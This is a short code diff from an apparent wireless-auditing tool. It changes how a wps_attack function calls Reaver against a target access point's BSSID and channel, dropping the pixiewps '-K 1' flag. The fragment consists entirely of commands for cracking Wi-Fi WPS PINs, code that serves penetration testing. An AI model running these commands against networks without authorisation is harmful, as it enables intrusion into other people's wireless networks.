@@ -3027,6 +3027,7 @@ def wps_attack(iface, target):
         if newreav > 0: break
 
     if newreav > 0:
+        # Old Reaver
         pid = Popen(
             ["reaver", "-i", iface, "-c", target.channel, "-b", target.bssid, "-vvv",
              "--no-nacks", "-L", "-a", "-P"],
@@ -3035,7 +3036,7 @@ def wps_attack(iface, target):
         # Default reaver for pixiewps
         pid = Popen(
             ["reaver", "-i", iface, "-c", target.channel, "-b", target.bssid, "-vv",
-             "--no-nacks", "-L", "-a", "-P", "-K 1"],
+             "--no-nacks", "-L", "-a", "-P"],
             stdout=p_out).pid
 
     # print 'Running reaver -i %s -c %s -b %s -vv -N -L -a -P' % (iface, target.channel, target.bssid),
